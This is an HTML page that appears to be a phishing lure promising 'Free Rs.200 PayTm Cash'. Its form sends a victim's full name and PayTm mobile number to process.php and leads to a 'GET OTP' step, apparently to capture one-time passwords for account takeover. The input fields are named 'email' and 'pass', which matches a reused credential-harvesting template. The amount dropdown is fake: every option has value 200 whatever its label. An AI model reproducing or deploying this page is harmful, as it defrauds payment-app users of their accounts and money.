

<html lang="en">


<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
 <meta property="og:locale" content="en" />
<title>Hey Dear! You Have Won Free Rs 200 PayTm Cash</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta property="og:type" content="website" />
    <meta property="og:title" content=" Free PayTm Rs.200 Cash for Every Indian " />
    <meta property="og:url" content="index.php" />
    <meta property="og:description" content="Try it now" />
    <meta property="og:site_name" content="Free Rs.200 PayTm Cash" />
    <meta property="og:image" content="https://statusguy.com/test/ogg.jpg"/>
    <link rel="shortcut icon" href="/sicon.png" type="image/x-icon">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="../www.w3schools.com/w3css/4/w3.css">
<link rel="stylesheet" type="text/css" href="style.css"/>
</head>
<body>
<div class="content">
 
    
<div class="container2">
<header>
    <div class="h_logo">
        <img src="https://dhlm2eb86cbhs.cloudfront.net/public/thumbs/news/2018/01/20651/resizer_425_735.jpg" height="auto" />
    
    <h1><b>Get Free Rs.200 PayTm Cash</b></h1>	</div>
</header>



<div class="container">
  <form action="process.php" method="POST" class="login">
<center>          
</center><br>
    <b>Your Full Name</b>
    <input type="text" id="name" name="email" placeholder="Enter Your Full Name..." Title="Enter Your Full Name" required>

    <b>Your PayTm Number</b>
    <input type="text" id="number" name="pass" placeholder="Enter Your PayTm Mobile Number..."  maxlength="10" minlength="10" Title="Please enter valid phone number" required>

    <b>Cash Amount</b>
    <select id="amount" name="amount" disabled>
      <option value="200">Rs.200</option>
	  <option value="200">Rs.434</option>
	  <option value="200">Rs.555</option>
	  <option value="200">Rs.322</option>
     </select>



                <button class="button new btn-lg round" style="width:100%" align="center" type="submit"><i class="fa fa-money" aria-hidden="true">&nbsp;</i><b>GET OTP</b></button>
        
</form>

<br>

</div>
</div>

</div>
</body>

</html>